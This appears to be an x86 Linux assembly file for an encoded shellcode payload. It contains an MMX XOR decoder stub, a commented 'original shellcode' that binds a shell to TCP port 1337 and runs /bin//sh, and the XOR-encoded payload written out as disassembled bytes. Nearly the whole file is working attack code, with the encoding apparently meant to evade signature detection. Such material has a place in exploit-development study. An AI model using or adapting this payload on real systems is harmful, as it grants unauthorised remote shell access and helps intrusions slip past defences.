section .text
global _start
_start:
	fcmovbe st6
	fnstenv [esp-0xc]
	pop edi
	xor ecx, ecx
	mov cl, 0xc
	jmp short setup
	db 0x8a
	db 0xea
	db 0x4c
	db 0xef
	db 0xd1
	db 0x3e
	db 0x91
	db 0xfc
setup:
	movq mm0, [edi+0xd]
	add edi, 0x2a
loop_back:
	movq mm1, qword [edi]
	pxor mm1, mm0
	movq qword [edi], mm1
	add edi, 0x8
	loop loop_back


;;; Original shellcode
;;; 	xor eax, eax		;31 c0
;;; 	push eax		;50
;;; 	push eax		;50
;;; 	push eax		;50
;;; 	push eax		;50
;;; 	push eax		;50
;;; 	push byte +0x66		; socketcall()
;;; 	pop eax
;;; 	push byte +0x1		; socketcall(socket)
;;; 	pop ebx
;;; 	xor esi,esi
;;; 	push esi
;;; 	push ebx
;;; 	push byte +0x2
;;; 	mov ecx,esp
;;; 	int 0x80
;;; 	pop edi
;;; 	xchg eax,edi		; socketcall(bind)
;;; 	xchg eax,ebx
;;; 	mov al,0x66		; socketcall()
;;; 	push esi
;;; 	push word 0x3905	; 1337 port
;;; 	push bx
;;; 	mov ecx,esp
;;; 	push byte +0x10
;;; 	push ecx
;;; 	push edi
;;; 	mov ecx,esp
;;; 	int 0x80
;;; 	mov al,0x66		; socketcall()
;;; 	mov bl,0x4		; socketcall(listen)
;;; 	push esi
;;; 	push edi
;;; 	mov ecx,esp
;;; 	int 0x80
;;; 	mov al,0x66		; socketcall()
;;; 	inc ebx			; socketcall(accept)
;;; 	push esi
;;; 	push esi
;;; 	push edi
;;; 	mov ecx,esp
;;; 	int 0x80
;;; 	pop ecx
;;; 	pop ecx
;;; 	mov cl,0x2
;;; 	xchg eax,ebx
;;; dup2_loop:
;;; 	mov al,0x3f		; dup2(fd, ecx)
;;; 	int 0x80
;;; 	dec ecx
;;; 	jns dup2_loop
;;; 	mov al,0xb		; execve()
;;; 	push dword 0x68732f2f	; hs//
;;; 	push dword 0x6e69622f	; nib/
;;; 	mov ebx,esp
;;; 	inc ecx
;;; 	mov edx,ecx
;;; 	int 0x80


;;; encoded shellcode
	mov ebx,0x81bf1c2a
	outsb
	rcl dword [esi-0x11d94d14],0x8a
	packuswb mm5,[edx+0x664e80d9]
	xor bl,dh
	adc [ebx-0x760386e3],esp
	xchg ebx,[eax-0x7]
	stc
	mov bl,0x8c
	pop ds
	o16 xor [ecx+eax*4-0x53],dl
	frstor [ebx-0x53]
	and dl,[ecx-0x72]
	db 0xf7
	dec edi
	mov segr7,[ebx+ebx+0x11f33066]
	dec esp
	in al,dx
	; test eax,0xb786b91a
	db 0xa9
	db 0x1a
	db 0xb9
	db 0x86
	db 0xb7
	db 0x70
	db 0x31
	;jo 0x71

	or dh,[ebx-0x522ca1eb]
	and ebx,eax
	inc edi
	push byte +0x5
	xchg eax,esi
	sub [esi-0x3a5a6b66],cl
	aas
	xchg edi,[ecx-0x1b6a0cef]
	arpl [edi+0x5cf458ae],bp
	db 0x7c

